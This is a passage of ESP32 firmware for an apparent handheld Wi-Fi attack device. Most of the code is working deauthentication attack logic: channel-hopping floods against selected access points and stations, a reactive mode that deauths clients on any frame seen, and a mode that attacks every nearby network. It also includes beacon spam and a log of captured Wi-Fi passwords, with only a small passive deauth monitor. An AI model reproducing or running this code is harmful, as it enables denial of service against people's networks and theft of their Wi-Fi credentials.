    const uint8_t* payload = pkt->payload;
    int8_t rssi = pkt->rx_ctrl.rssi;
    
    if (pkt->rx_ctrl.sig_len < 24) return;

    uint8_t packetBSSID[6];
    uint8_t clientMac[6];  // ← Renamed from srcMac to clientMac
    bool hasClientMac = false;  // ← Flag to track if packet contains a client MAC
    
    // Extract based on frame type
    if (type == WIFI_PKT_MGMT) {
        // Management frames: BSSID at offset 16, Source at offset 10
        memcpy(packetBSSID, &payload[16], 6);
        memcpy(clientMac, &payload[10], 6);
        hasClientMac = true;  // Source MAC is the client (for probe requests, etc.)
    } 
    else if (type == WIFI_PKT_DATA) {
        // Data frames: Check ToDS/FromDS bits for correct address mapping
        uint8_t frameControl1 = payload[1];
        bool toDS = (frameControl1 & 0x01);
        bool fromDS = (frameControl1 & 0x02) >> 1;
        
        if (!fromDS && toDS) {
            // Client → AP: Source at Address 2 is client MAC
            memcpy(packetBSSID, &payload[4], 6);
            memcpy(clientMac, &payload[10], 6);  // Source = client
            hasClientMac = true;
        } else if (fromDS && !toDS) {
            // AP → Client: Destination at Address 1 is client MAC
            memcpy(packetBSSID, &payload[10], 6);
            memcpy(clientMac, &payload[4], 6);  // Destination = client
            hasClientMac = true;
        } else {
            return;
        }
    }
    else if (type == WIFI_PKT_CTRL) {
        // Control frames (RTS/CTS)
        uint8_t frameControl0 = payload[0];
        uint8_t subtype = (frameControl0 >> 4) & 0x0F;
        
        // For RTS (0x0B) and CTS (0x0C) we can get address
        if (subtype == 0x0B || subtype == 0x0C) {
            memcpy(packetBSSID, &payload[10], 6);
            memcpy(clientMac, &payload[10], 6);
            hasClientMac = true;
        } else {
            return;
        }
    }

    // Check if this packet belongs to the AP we are currently scanning
    if (memcmp(packetBSSID, currentScanBSSID, 6) != 0) {
        return;
    }

    // COUNT ALL PACKETS THAT CONTAIN A CLIENT MAC
    if (hasClientMac) {
        stationScanPacketCount++;
    }

    // Convert client MAC to string for processing
    char clientMacStr[18];
    snprintf(clientMacStr, sizeof(clientMacStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             clientMac[0], clientMac[1], clientMac[2], clientMac[3], clientMac[4], clientMac[5]);
    String macString = String(clientMacStr);

    // Skip broadcast / multicast (not real clients)
    if (macString.startsWith("FF:FF:FF:FF:FF:FF") ||
        macString.startsWith("01:00:5E") ||
        macString.startsWith("33:33")) {
        return;
    }

    // Skip the AP itself
    char apMacStr[18];
    snprintf(apMacStr, sizeof(apMacStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             currentScanBSSID[0], currentScanBSSID[1], currentScanBSSID[2],
             currentScanBSSID[3], currentScanBSSID[4], currentScanBSSID[5]);
    if (macString.equalsIgnoreCase(apMacStr)) return;

    // Add to station list if new
    if (!isMacAlreadySeen(macString, currentScanSSID)) {
        addMacToSeen(macString, currentScanSSID, currentScanBSSID, currentScanChannel);
        
        // Show debug
        String pktType = "UNK";
        if (type == WIFI_PKT_MGMT) pktType = "MGMT";
        else if (type == WIFI_PKT_DATA) pktType = "DATA";
        else if (type == WIFI_PKT_CTRL) pktType = "CTRL";
        
        Serial.printf("[%s] Found station: %s for AP: %s (RSSI: %d)\n", 
                      pktType.c_str(), clientMacStr, currentScanSSID.c_str(), rssi);
    }
}
// Dedicated deauth monitor promiscuous callback
void promiscuousCallbackDeauth(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int8_t rssi = pkt->rx_ctrl.rssi;   // ← ADD THIS LINE
    const uint8_t* payload = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return;

    uint8_t frameControl = payload[0];
    uint8_t subtype = frameControl >> 4;

    if (subtype == 12 || subtype == 10) {
        monitorDeauthPacketCount++; // Track deauth packet rate
        // Blink LED - turns on, will be turned off in the draw function
        digitalWrite(LED_PIN, HIGH);
        lastPulseUpdate = millis();  // Reuse existing variable
        pulseState = true;            // Reuse existing variable
        
        uint8_t reason = payload[24];  // ADD THIS - reason code at byte 24
        uint8_t* srcMac = (uint8_t*)&payload[10];
        char srcMacStr[18];
        snprintf(srcMacStr, sizeof(srcMacStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]);

        uint8_t* dstMac = (uint8_t*)&payload[4];
        char dstMacStr[18];
        snprintf(dstMacStr, sizeof(dstMacStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 dstMac[0], dstMac[1], dstMac[2], dstMac[3], dstMac[4], dstMac[5]);

        String apSsid = "";
        for (int i = 0; i < deauthNetworkCount; i++) {
            if (memcmp(deauthNetworks[i].bssid, srcMac, 6) == 0) {
                apSsid = deauthNetworks[i].ssid;
                break;
            }
        }
        if (apSsid == "") {
        apSsid = "[" + String(srcMacStr) + "]";  // Show MAC in brackets
        }

        DeauthEvent ev;
        ev.apMac = String(srcMacStr);
        ev.apSsid = apSsid;
        ev.stationMac = String(dstMacStr);
        ev.time = millis();
        ev.rssi = pkt->rx_ctrl.rssi;   
        ev.reason = reason;  

        deauthEvents[deauthEventIndex] = ev;
        deauthEventIndex = (deauthEventIndex + 1) % MAX_DEAUTH_EVENTS;
        if (deauthEventCount < MAX_DEAUTH_EVENTS) deauthEventCount++;
    }
}

void promiscuousDeauthSniff(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!sniff_deauth_active) return;

  // Accept ALL packet types - Management, Data, AND Control
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_CTRL) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = pkt->payload;
  if (pkt->rx_ctrl.sig_len < 24) return;

  uint8_t frameControl0 = payload[0];
  uint8_t typeField = (frameControl0 >> 2) & 0x03;
  uint8_t subtype = (frameControl0 >> 4) & 0x0F;

  // Extract MAC addresses (varies by frame type)
  uint8_t srcAddr[6];
  uint8_t dstAddr[6];
  uint8_t bssidField[6];
  
  if (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA) {
    memcpy(srcAddr, &payload[10], 6);   // Address 2 (source)
    memcpy(dstAddr, &payload[4], 6);    // Address 1 (destination)
    memcpy(bssidField, &payload[16], 6); // Address 3 (BSSID)
  } 
  else if (type == WIFI_PKT_CTRL) {
    // For RTS/CTS frames
    uint8_t ctrlSubtype = (frameControl0 >> 4) & 0x0F;
    if (ctrlSubtype == 0x0B || ctrlSubtype == 0x0C) {
      memcpy(srcAddr, &payload[10], 6);
      memcpy(dstAddr, &payload[4], 6);
      memcpy(bssidField, &payload[10], 6); // Approximate for control frames
    } else {
      return; // ACK and others - skip
    }
  }

  // Check if packet belongs to target AP
  bool matches = (memcmp(srcAddr, deauth_target_bssid, 6) == 0) ||
                 (memcmp(bssidField, deauth_target_bssid, 6) == 0);
  if (!matches) return;

  

  bool fromClient = (memcmp(srcAddr, deauth_target_bssid, 6) != 0);
  
  // If packet is FROM the AP → send broadcast deauth to AP
  if (!fromClient) {
      _Network target;
      target.ssid = deauth_target_ssid;
      target.ch = deauth_target_channel;
      memcpy(target.bssid, deauth_target_bssid, 6);
      esp_wifi_set_channel(target.ch, WIFI_SECOND_CHAN_NONE);
      static int pattern = 0;
      pattern = (pattern + 1) % 1;
      flood_send_deauth_attack(&target, pattern);
      reactive_deauth_count++;  
      return;
  }

  // --- From here: packet is from a client ---
  
  // Send deauth to client for ANY frame (auth, reassoc, data, probe, action, etc.)
  char clientMac[18];
  snprintf(clientMac, sizeof(clientMac), "%02X:%02X:%02X:%02X:%02X:%02X",
           srcAddr[0], srcAddr[1], srcAddr[2],
           srcAddr[3], srcAddr[4], srcAddr[5]);
  currentClientMac = String(clientMac);
  
  // Print less frequently to avoid Serial slowdown
  static uint32_t frameCount = 0;
  frameCount++;
  if (frameCount % 50 == 1) {
    Serial.println("Deauth sent to client: " + String(clientMac));
  }
  // BLINK LED ON PACKET DETECTION (non-blocking)
  digitalWrite(LED_PIN, HIGH);
  lastPulseUpdate = millis();  // Reuse existing variable
  pulseState = true;
  send_deauth_to_client(deauth_target_bssid, deauth_target_channel, srcAddr);
  
  _Network target;
  target.ssid = deauth_target_ssid;
  target.ch = deauth_target_channel;
  memcpy(target.bssid, deauth_target_bssid, 6);
  esp_wifi_set_channel(target.ch, WIFI_SECOND_CHAN_NONE);
  static int pattern = 0;
  pattern = (pattern + 1) % 1;
  flood_send_deauth_attack(&target, pattern);
  reactive_deauth_count++;
  
  // Count authentication/reassociation for stats
  if (subtype == 0xB) auth_packet_count++;
  else if (subtype == 0x2) reassoc_packet_count++;
}
void startDeauthSniffing() {
  if (!hasSelectedTargets()) return;

  // Find the first selected AP (the one being deauthed)
  for (int i = 0; i < MAX_TARGETS; i++) {
    if (_networks[i].selected && isValidAP(_networks[i])) {
      memcpy(deauth_target_bssid, _networks[i].bssid, 6);
      deauth_target_channel = _networks[i].ch;
      deauth_target_ssid = _networks[i].ssid;
      break;
    }
  }

  // Reset counters
  auth_packet_count = 0;
  reassoc_packet_count = 0;
  sniff_deauth_active = true;
  esp_wifi_set_channel(deauth_target_channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(promiscuousDeauthSniff);
  wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
  };
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);

}

void stopDeauthSniffing() {
  sniff_deauth_active = false;
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
}

void startDeauthMonitor() {
    apDeauthActive = false;
    stationDeauthActive = false;
    deauthing_active = false;
    attack_running = false;

    if (apAndWebRunning) {
        webServer.stop();
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        apAndWebRunning = false;
      
    }
    

    WiFi.mode(WIFI_OFF);
    delay(100);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filter);
    
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallbackDeauth);

    deauthMonitorActive = true;
    deauthMonitorAutomatic = true;
    deauthMonitorLastButtonPress = millis();
    currentMonitorChannel = 1;
    esp_wifi_set_channel(currentMonitorChannel, WIFI_SECOND_CHAN_NONE);

    deauthEventIndex = 0;
    deauthEventCount = 0;
}
void resetApDeauthState() {
    activeChannelCount = 0;
    channelIndex = 0;
    lastChannelListRebuild = 0;
    memset(sentToAp, 0, sizeof(sentToAp));
    cycleCompleteCount = 0;
    lastHopTime = 0;
    lastDeauthTime = 0;
    apPacketCounter = 0;
    currentChannelHop = 1;
    hopDirection = 1;
    lastRateUpdate = 0;
    lastLedBlink = 0;
    ledState = false;
    pattern = 0;
    Serial.println("AP Deauth state reset");
}
void stopDeauthMonitor() {
    deauthMonitorActive = false;
    deauthMonitorAutomatic = true;
    deauthScanning = false;
    resetDeauthIndices();
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    WiFi.mode(WIFI_STA);

    startAccessPoint();
}
bool selectNextTargetForScan() {
    int found = 0;
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (_networks[i].selected && isValidAP(_networks[i])) {
            if (found == currentTargetScanIndex) {
                memcpy(currentScanBSSID, _networks[i].bssid, 6);
                currentScanChannel = _networks[i].ch;
                currentScanSSID = _networks[i].ssid;

                // RESET PACKET COUNTER FOR NEW AP
                stationScanPacketCount = 0;
                
                // Set channel for this AP
                esp_wifi_set_channel(currentScanChannel, WIFI_SECOND_CHAN_NONE);
                
                Serial.printf("Now scanning AP %d/%d: %s (BSSID: %s, ch %d)\n",
                              currentTargetScanIndex + 1,
                              getSelectedTargetCount(),
                              currentScanSSID.c_str(),
                              bssidToString(currentScanBSSID).c_str(),
                              currentScanChannel);
                return true;
            }
            found++;
        }
    }
    return false; 
}
void performReboot() {
    if (webServerRunning) {
        webServer.stop();
        dnsServer.stop();
    }
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_8x13_tf);
    u8g2.drawStr(20, 35, "REBOOTING...");
    u8g2.sendBuffer();
    delay(1000);                 
    ESP.restart();
}

void performDeepSleep() {
    if (webServerRunning) {
        webServer.stop();
        dnsServer.stop();
    }
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_8x13_tf);
    u8g2.drawStr(20, 35, "SLEEPING...");
    u8g2.sendBuffer();
    delay(2000);  
    
    u8g2.setPowerSave(1); 
    u8g2.clearBuffer();
    u8g2.sendBuffer();
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    esp_sleep_enable_ext0_wakeup(GPIO_NUM_27, 0);
    // Enter deep sleep 
    esp_deep_sleep_start();
}
int hiddenRecoveryTotal = 0;

void setSoftAPChannel(int channel) {
    wifi_config_t conf;
    esp_wifi_get_config(WIFI_IF_AP, &conf);
    conf.ap.channel = channel;
    esp_wifi_set_config(WIFI_IF_AP, &conf);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

// ========== UTILITY FUNCTIONS ==========
int getSelectedTargetCount() {
    int count = 0;
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (_networks[i].selected && _networks[i].ch > 0) {
            count++;
        }
    }
    return count;
}

int getSelectedStationCount() {
    int count = 0;
    for (int i = 0; i < scannedStationCount; i++) {
        if (stationSelected[i]) count++;
    }
    return count;
}

bool hasSelectedTargets() {
    return getSelectedTargetCount() > 0;
}

bool isValidAP(const _Network& net) {
    // Check if it's a valid AP (has channel > 0 and a valid BSSID)
    if (net.ch == 0) return false;
    
    // Check if BSSID is valid (not all zeros)
    bool validBSSID = false;
    for (int j = 0; j < 6; j++) {
        if (net.bssid[j] != 0) {
            validBSSID = true;
            break;
        }
    }
    return validBSSID;  // Include both visible and hidden SSIDs
}
bool isAnyAttackActive() {
    return apDeauthActive || stationDeauthActive || combinedDeauthActive || 
           flood_active || deauthAllActive || hiddenRecoveryActive || 
           deauthMonitorActive || reactiveDeauthActive || isScanningStations;
}

// ========== FILE SYSTEM & PASSWORD LOGGING ==========
void initFileSystem() {
    if (!LittleFS.begin()) {
        Serial.println("LittleFS mount failed");
        LittleFS.format();
        if (!LittleFS.begin()) {
            Serial.println("LittleFS format failed");
            return;
        }
    }
    Serial.println("LittleFS mounted successfully");
    
    if (LittleFS.exists(LOG_FILE)) {
        File file = LittleFS.open(LOG_FILE, "r");
        if (file) {
            passwordLogCount = 0;
            while (file.available() && passwordLogCount < MAX_PASSWORD_LOGS) {
                String line = file.readStringUntil('\n');
                line.trim();
                if (line.length() > 0) {
                    int firstSep = line.indexOf('|');
                    int secondSep = line.indexOf('|', firstSep + 1);
                    int thirdSep = line.indexOf('|', secondSep + 1);
                    
                    if (firstSep > 0 && secondSep > firstSep && thirdSep > secondSep) {
                        passwordLogs[passwordLogCount].ssid = line.substring(0, firstSep);
                        passwordLogs[passwordLogCount].bssid = line.substring(firstSep + 1, secondSep);
                        passwordLogs[passwordLogCount].password = line.substring(secondSep + 1, thirdSep);
                        passwordLogs[passwordLogCount].verified = (line.substring(thirdSep + 1) == "1");
                        passwordLogCount++;
                    }
                }
            }
            file.close();
        }
    }
}

void savePasswordLog(String ssid, String bssid, String password, bool verified) {
    if (passwordLogCount >= MAX_PASSWORD_LOGS) {
        for (int i = 0; i < MAX_PASSWORD_LOGS - 1; i++) {
            passwordLogs[i] = passwordLogs[i + 1];
        }
        passwordLogCount = MAX_PASSWORD_LOGS - 1;
    }
    
    passwordLogs[passwordLogCount].ssid = ssid;
    passwordLogs[passwordLogCount].bssid = bssid;
    passwordLogs[passwordLogCount].password = password;
    passwordLogs[passwordLogCount].verified = verified;
    passwordLogCount++;
    
    File file = LittleFS.open(LOG_FILE, "a");
    if (file) {
        file.println(ssid + "|" + bssid + "|" + password + "|" + (verified ? "1" : "0"));
        file.close();
    }
}


String bytesToStr(const uint8_t* b, uint32_t size) {
    String str;
    const char ZERO = '0';
    const char DOUBLEPOINT = ':';
    for (uint32_t i = 0; i < size; i++) {
        if (b[i] < 0x10) str += ZERO;
        str += String(b[i], HEX);
        if (i < size - 1) str += DOUBLEPOINT;
    }
    return str;
}

void clearArray() {
    for (int i = 0; i < MAX_TARGETS; i++) {
        _networks[i] = _Network();
    }
}


int countNetworks() {
    int count = 0;
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (_networks[i].ch > 0) {
            count++;
        } else {
            break;  // Assumes all valid networks are contiguous from index 0
        }
    }
    return count;
}

// ========== DRAWING FUNCTIONS ==========







void setDisplayPower(bool on) {
    if (on) {
        u8g2.setPowerSave(0);
        displaySleep = false;
        u8g2.clearBuffer();
        u8g2.sendBuffer();
    } else {
        u8g2.setPowerSave(1);
        displaySleep = true;
    }
}

void apDeauthTask(void *pvParameters) {
    while (true) {
if (apDeauthActive && !stationDeauthActive && hasSelectedTargets()) {
    unsigned long now = millis();
    const unsigned long HOP_INTERVAL = 50; 
    
    if (now - lastHopTime >= HOP_INTERVAL) {
        if (activeChannelCount == 0 || (now - lastChannelListRebuild) >= 500) {
            activeChannelCount = 0;
            bool channelAdded[15] = {false};
            
            for (int i = 0; i < MAX_TARGETS; i++) {
                if (_networks[i].selected && isValidAP(_networks[i])) {
                    int ch = _networks[i].ch;
                    if (ch >= 1 && ch <= 14 && !channelAdded[ch]) {
                        activeChannels[activeChannelCount++] = ch;
                        channelAdded[ch] = true;
                    }
                }
            }
            
            // If no channels found, sweep all
            if (activeChannelCount == 0) {
                for (int ch = 1; ch <= 14; ch++) {
                    activeChannels[activeChannelCount++] = ch;
                }
            }
            channelIndex = 0;
            lastChannelListRebuild = now;
        }
        
        // Hop to next channel
        if (activeChannelCount > 0) {
            currentChannelHop = activeChannels[channelIndex];
            esp_wifi_set_channel(currentChannelHop, WIFI_SECOND_CHAN_NONE);
            channelIndex = (channelIndex + 1) % activeChannelCount;
        } else {
            // Fallback: sweep through channels 1-14
            currentChannelHop += hopDirection;
            if (currentChannelHop > 14) {
                currentChannelHop = 13;
                hopDirection = -1;
            } else if (currentChannelHop < 1) {
                currentChannelHop = 2;
                hopDirection = 1;
            }
            esp_wifi_set_channel(currentChannelHop, WIFI_SECOND_CHAN_NONE);
        }
        
        lastHopTime = now;
    }
    const unsigned long DEAUTH_INTERVAL = 5;
    
    if (now - lastDeauthTime >= DEAUTH_INTERVAL) {
        bool packetSent = false;
        
        // Iterate through all selected APs
        for (int i = 0; i < MAX_TARGETS; i++) {
            if (_networks[i].selected && isValidAP(_networks[i])) {
                // Check if this AP is on the current channel
                if (_networks[i].ch == currentChannelHop) {
                    // Send deauth to this AP (broadcast)
                    
                    pattern = (pattern + 1) % 1;
                    flood_send_deauth_attack(&_networks[i], pattern);
                    apPacketCounter++;
                    packetSent = true;
                    sentToAp[i] = true;
                }
            }
        }
        
        lastDeauthTime = now;
        lastActivityTime = now;
        
        if (now - lastLedBlink > 30) {
            ledState = !ledState;
            digitalWrite(LED_PIN, ledState ? HIGH : LOW);
            lastLedBlink = now;
        }
        
        // Track cycle completion (optional)
        bool allSent = true;
        for (int i = 0; i < MAX_TARGETS; i++) {
            if (_networks[i].selected && isValidAP(_networks[i]) && !sentToAp[i]) {
                allSent = false;
                break;
            }
        }
        if (allSent && getSelectedTargetCount() > 0) {
            cycleCompleteCount++;
            // Reset sent tracking for next cycle
            memset(sentToAp, 0, sizeof(sentToAp));
        }
    }
    
    // Update packet rate display every second
    if (now - lastRateUpdate >= 1000) {
        packetsPerSecond = apPacketCounter;
        apPacketCounter = 0;
        lastRateUpdate = now;
        if (now - lastDebugPrint >= 1000) {
        Serial.printf("[AP DEAUTH] Rate: %d p/s, Current CH: %d, Targets: %d, Cycles: %d\n",
                 packetsPerSecond, currentChannelHop, getSelectedTargetCount(), cycleCompleteCount);
                 lastDebugPrint = now;
        }
    }
}

if (stationDeauthActive && !hasSelectedTargets() && getSelectedStationCount() > 0) {
    unsigned long now = millis();
    
    // Rebuild channel list every 2 seconds (like AP rebuilds every 500ms, but stations change less)
    static unsigned long lastRebuild = 0;
    if (now - lastRebuild >= 2000) {
        rebuildStaHopChannels();
        lastRebuild = now;
    }
    
    // Channel hopping every 50ms (same as AP dedicated)
    const unsigned long HOP_INTERVAL = 50;
    if (now - lastStaHopTime >= HOP_INTERVAL) {
        if (staHopCount > 0) {
            staHopIndex = (staHopIndex + 1) % staHopCount;
            esp_wifi_set_channel(staHopChannels[staHopIndex], WIFI_SECOND_CHAN_NONE);
        }
        lastStaHopTime = now;
    }
    
    // Send deauth packets every 2ms (same as AP dedicated)
    const unsigned long PKT_INTERVAL = 2;
    if (now - lastStaDeauthSend >= PKT_INTERVAL) {
        int curCh = staHopChannels[staHopIndex];
        bool sent = false;
        
    for (int i = 0; i < scannedStationCount; i++) {
      if (stationSelected[i] && stationAPChannel[i] == curCh) {
        _Network apTarget;
        apTarget.ch = stationAPChannel[i];
        apTarget.ssid = stationNetworkSSID[i];
        memcpy(apTarget.bssid, stationAPBSSIDRaw[i], 6);   // direct copy, no sscanf
        flood_send_station_deauth(&apTarget, scannedStationMAC[i], 0);
        staHopPackets++;
      }
    }
        
        lastStaDeauthSend = now;
        lastActivityTime = now;
        
        // Fast LED blink (same as AP)
        if (now - lastLedBlink > 30) {
            ledState = !ledState;
            digitalWrite(LED_PIN, ledState);
            lastLedBlink = now;
        }
    }
    
    // Update displayed packet rate (reuse packetsPerSecond for UI)
    if (now - lastRateUpdate >= 1000) {
        packetsPerSecond = staHopPackets;
        staHopPackets = 0;
        lastRateUpdate = now;
    }
}
if (apDeauthActive && stationDeauthActive && (hasSelectedTargets() || getSelectedStationCount() > 0)) {
    wifi_mode_t currentMode;
    esp_wifi_get_mode(&currentMode);
    if (currentMode != WIFI_MODE_AP) {
        esp_wifi_set_mode(WIFI_MODE_AP);
        delay(10);
    }
    unsigned long currentMillis = millis();
    
    // Channel hopping - switch channels rapidly
    if (currentMillis - lastDeauthChannelChange >= DEAUTH_CHANNEL_HOP_INTERVAL) {
        static int channelList[14];
        static int channelCount = 0;
        static int channelHopIndex = 0;
        
        if (channelCount == 0 || currentMillis % 1000 < 50) {
            channelCount = 0;
            bool channelsAdded[15] = {false};
            
            // Add channels from selected APs
            for (int i = 0; i < MAX_TARGETS; i++) {
                if (_networks[i].selected && isValidAP(_networks[i])) {
                    int ch = _networks[i].ch;
                    if (ch >= 1 && ch <= 14 && !channelsAdded[ch]) {
                        channelList[channelCount++] = ch;
                        channelsAdded[ch] = true;
                    }
                }
            }
            
            // Add channels from selected stations
            for (int i = 0; i < scannedStationCount; i++) {
                if (stationSelected[i] && stationAPChannel[i] >= 1 && stationAPChannel[i] <= 14) {
                    int ch = stationAPChannel[i];
                    if (!channelsAdded[ch]) {
                        channelList[channelCount++] = ch;
                        channelsAdded[ch] = true;
                    }
                }
            }
            
            if (channelCount == 0) {
                for (int ch = 1; ch <= 14; ch++) {
                    channelList[channelCount++] = ch;
                }
            }
            channelHopIndex = 0;
        }
        
        if (channelCount > 0) {
            currentDeauthChannel = channelList[channelHopIndex];
            esp_wifi_set_channel(currentDeauthChannel, WIFI_SECOND_CHAN_NONE);
            channelHopIndex = (channelHopIndex + 1) % channelCount;
        }
        
        lastDeauthChannelChange = currentMillis;
    }
    
    // Send flood packets to BOTH APs AND Stations on current channel
    if (currentMillis - last_packet_time >= 2) {  // 2ms interval
        // In combined handler
        static int apPattern = 0;
        static int stationPattern = 0;
        
        // 1. Send deauth to ALL SELECTED APs on current channel
        for (int i = 0; i < MAX_TARGETS; i++) {
            if (_networks[i].selected && isValidAP(_networks[i]) && _networks[i].ch == currentDeauthChannel) {
                apPattern = (apPattern + 1) % 1;
                flood_send_deauth_attack(&_networks[i], apPattern);
                packetCounter++;
            }
        }
        
    for (int i = 0; i < scannedStationCount; i++) {
      if (stationSelected[i] && stationAPChannel[i] == currentDeauthChannel) {
        _Network apTarget;
        apTarget.ch = stationAPChannel[i];
        apTarget.ssid = stationNetworkSSID[i];
        memcpy(apTarget.bssid, stationAPBSSIDRaw[i], 6);
        flood_send_station_deauth(&apTarget, scannedStationMAC[i], 0);
        packetCounter++;
      }
    }
        
        last_packet_time = currentMillis;
        lastActivityTime = currentMillis;
        
        // LED blink on every packet
        static bool ledBlinkState = false;
        static unsigned long lastLedBlinkTime = 0;
        if (currentMillis - lastLedBlinkTime > 30) {
            ledBlinkState = !ledBlinkState;
            digitalWrite(LED_PIN, ledBlinkState);
            lastLedBlinkTime = currentMillis;
        }
    }
    
    // Update packet rate display
    if (currentMillis - lastRateUpdate >= 1000) {
        packetsPerSecond = packetCounter;
        packetCounter = 0;
        lastRateUpdate = currentMillis;
    }
}
if (flood_active) {
    unsigned long now = millis();
    if (now - flood_last_packet_time >= 1) {  // 3ms interval for high-speed flood
        // Find first valid AP (including hidden)
        _Network* target = nullptr;
        for (int i = 0; i < MAX_TARGETS; i++) {
            if (_networks[i].selected && isValidAP(_networks[i])) {
                target = &_networks[i];
                
                // Debug output for hidden SSIDs (optional)
                if (_networks[i].ssid.length() == 0) {
                    static unsigned long lastHiddenDebug = 0;
                    if (now - lastHiddenDebug > 5000) {  // Print every 5 seconds
                        Serial.printf("[DEAUTH FLOOD] Targeting hidden AP on channel %d (BSSID: %s)\n", 
                                     _networks[i].ch, 
                                     bytesToStr(_networks[i].bssid, 6).c_str());
                        lastHiddenDebug = now;
                    }
                }
                break;
            }
        }
        
        if (target) {
            // ✅ ADD THIS LINE
            esp_wifi_set_channel(target->ch, WIFI_SECOND_CHAN_NONE);
            flood_current_pattern = (flood_current_pattern + 1) % 6;
            flood_send_deauth_attack(target, flood_current_pattern);
            flood_last_packet_time = now;
            lastActivityTime = now;
            packetCounter++;
            if (now - lastRateUpdate >= 1000) {
                packetsPerSecond = packetCounter;
                packetCounter = 0;
                lastRateUpdate = now;
            }
            static bool ledState = false;
            static unsigned long lastLedBlink = 0;
            if (now - lastLedBlink > 50) {  // Blink very fast (20 times per second)
                ledState = !ledState;
                digitalWrite(LED_PIN, ledState ? HIGH : LOW);
                lastLedBlink = now;
            }
            if (flood_packet_count % 100 == 0) {
                if (currentScreen == SCREEN_DEAUTH_FLOOD) {
                }
            }
        } else {
            flood_active = false;
            
            digitalWrite(LED_PIN, LOW);  // Turn off LED
            Serial.println("[DEAUTH FLOOD] Stopped: No valid AP selected");
            
            // Show error message on screen
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_8x13_tf);
            u8g2.drawStr(5, 12, "DEAUTH FLOOD");
            u8g2.drawLine(0, 15, 127, 15);
            u8g2.setFont(u8g2_font_8x13_tf);
            u8g2.drawStr(10, 35, "NO VALID AP");
            u8g2.drawStr(10, 50, "Select an AP first");
            u8g2.sendBuffer();
            delay(2000);
            
            // Return to main menu
            currentScreen = SCREEN_MAIN;
            scrollOffset = 0;
            selectedItemIndex = 0;
        }
    }
}
if (deauthAllActive) {
    unsigned long now = millis();
    
    // Periodic scan every 2 minutes
    if (now - deauthAllLastScan >= DEAUTH_ALL_SCAN_INTERVAL) {
        scanDeauthAllNetworks();
        deauthAllLastScan = now;
        // Reset index if out of bounds (in case count decreased)
        if (deauthAllCurrentIndex >= deauthAllNetworkCount) {
            deauthAllCurrentIndex = 0;
        }
        deauthAllApStartTime = now; // restart timing for current AP
    }
    
    // Switch AP after 2 seconds
    if (deauthAllNetworkCount > 0 && now - deauthAllApStartTime >= DEAUTH_ALL_AP_DURATION) {
        deauthAllCurrentIndex = (deauthAllCurrentIndex + 1) % deauthAllNetworkCount;
        deauthAllApStartTime = now;
        // Optionally, set channel immediately for next AP
        esp_wifi_set_channel(deauthAllNetworks[deauthAllCurrentIndex].ch, WIFI_SECOND_CHAN_NONE);
    }
    
    // Send deauth packets at high rate
    if (deauthAllNetworkCount > 0 && now - deauthAllLastPacket >= DEAUTH_ALL_PACKET_INTERVAL) {
        _Network& target = deauthAllNetworks[deauthAllCurrentIndex];
        // Ensure we're on the correct channel
        esp_wifi_set_channel(target.ch, WIFI_SECOND_CHAN_NONE);
        static int floodPattern = 0;
        floodPattern = (floodPattern + 1) % 6;
        flood_send_deauth_attack(&target, floodPattern);
        
        deauthAllPacketCount++;
        deauthAllLastPacket = now;
        lastActivityTime = now;
        
        // Visual feedback: blink LED
        static bool ledState = false;
        static unsigned long lastLedBlink = 0;
        if (now - lastLedBlink > 50) {
            ledState = !ledState;
            digitalWrite(LED_PIN, ledState ? HIGH : LOW);
            lastLedBlink = now;
        }
    }
}


if (beaconSpam.running) {
        beaconSpam.update();
}
   
        delay(1);
    }
}

// ========== ENHANCED MENU HANDLER ==========
void menu() {
    static unsigned long lastButtonPress = 0;
    const unsigned long debounceTime = 200;
    unsigned long currentMillis = millis();

    if (digitalRead(BUTTON_UP) == LOW || digitalRead(BUTTON_DOWN) == LOW || 
    digitalRead(BUTTON_OK) == LOW || digitalRead(BUTTON_BACK) == LOW ||
    vBtn_UP || vBtn_DOWN || vBtn_OK || vBtn_BACK) {
    
    // Only wake up, don't process if display was sleeping
    if (displaySleep) {
        setDisplayPower(true);
        lastButtonPressTime = currentMillis;
        lastActivityTime = currentMillis;
        return;  // Exit button handling - don't process the press
    }
    
    // Normal button press when display is ON
    lastButtonPressTime = currentMillis;
    lastActivityTime = currentMillis;
    }

   if (!displaySleep && (currentMillis - lastButtonPressTime >= 600000)) {
    setDisplayPower(false);
   }
   if (currentMillis - lastActivityTime >= 1200000) {
